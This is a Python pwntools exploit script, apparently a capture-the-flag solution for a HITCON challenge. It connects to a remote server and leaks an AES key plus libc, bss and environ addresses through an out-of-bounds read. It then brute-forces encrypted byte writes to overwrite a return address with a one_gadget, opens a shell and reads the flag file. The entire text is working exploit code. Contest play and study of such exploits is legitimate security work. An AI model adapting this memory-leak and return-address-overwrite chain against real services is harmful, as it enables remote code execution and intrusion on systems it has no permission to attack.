#!/usr/bin/env python2
from pwn import *
from IPython import embed
from Crypto.Cipher import AES

context.arch = 'amd64'

def encrypt(data, key, iv=0):
    if iv == 0:
        iv = "\x00" * 0x10
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(data)

def decrypt(data, key, iv=0):
    if iv == 0:
        iv = "\x00" * 0x10
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data)

r = remote('3.113.219.89', 31337)
#r = remote('127.0.0.1', 31337)
#r = process('./chall')

def f(off, sz, no_ret=0):
    if no_ret:
        r.sendline(str(off))
    else:
        r.sendlineafter('offset:', str(off))
    if no_ret:
        r.sendline(str(sz))
    else:
        r.sendlineafter('size:', str(sz))
    if no_ret:
        #return r.recv(recv_sz)
        #return r.recvrepeat(3)
        return
    else:
        return r.recv((sz & 0xFFFFFFFFFFFFFFF0) + 16)

#x = f(-0x20, 0x1fffffff0, 1)
#x = f(-0x20, 0xffffffff00000000-0x10, 1)
key = f(-0x20, 15)

libc_enc = f(-0x40, 15)
libc_dec = decrypt(libc_enc, key)
libc = u64(libc_dec[:8]) - 0x3ec680
print 'libc:', hex(libc)

bss_enc = f(-0x398, 15)
bss_dec = decrypt(bss_enc, key)
bss = u64(bss_dec[:8]) - 0x8
print 'bss:', hex(bss)

buf_addr = bss+0x3a0
environ_addr = libc+0x3ee098
environ_enc = f(environ_addr-buf_addr, 15)
environ_dec = decrypt(environ_enc, key)
environ = u64(environ_dec[:8]) - 0x8
print 'environ:', hex(environ)

ret_addr = environ-0xe8
magic = libc+0x4f322
#magic = libc+0x4f2c5
counter_addr = ret_addr-0x30-0x8

# overwrite i
f(counter_addr-buf_addr, 15)
print ('i is good')

total_t = 0
magic = flat(magic)
print 'ret addr:', hex(ret_addr)
orig = flat(libc+0x21b97, 1, environ-8)
for pos in range(8):
    # pre-calc
    t = 0
    while True:
        t += 1
        x = encrypt(orig[pos:pos+16], key)
        #print x[0].encode('hex'), magic[pos].encode('hex')
        orig = orig[:pos]+x+orig[pos+16:]
        if x[0] == magic[pos]:
            #print 'magic', pos
            break
    for i in range(t):
        f(ret_addr-buf_addr+pos, 15, no_ret=1)
    total_t += t
    #print 'sent all'
print ('magic is good')

environ = flat(environ+8)
orig = environ_enc+flat(0)
print orig.encode('hex')
for pos in range(8):
    # pre-calc
    t = 0
    while True:
        t += 1
        x = encrypt(orig[pos:pos+16], key)
        #print x[0].encode('hex'), magic[pos].encode('hex')
        orig = orig[:pos]+x+orig[pos+16:]
        if x[0] == environ[pos]:
            break
    for i in range(t):
        x = f(environ_addr-buf_addr+pos, 15, no_ret=1)
    total_t += t

print ('environ is good')

print total_t
for i in range(total_t):
    r.recvuntil('offset')
#r.interactive()
while True:
    x = f(counter_addr-buf_addr, 15)
    b = ord(x[11])
    if b&0x80 == 0:
        break

#embed()

'''
x = f(-0x20, 0x10-1)
xx = [c.encode('hex') for c in x]
print ' '.join(xx)
'''
r.sendline('cat /home/`whoami`/flag.txt')

r.interactive()
#hitcon{is_tH15_A_crypTO_cha11eng3_too00oo0oo???}
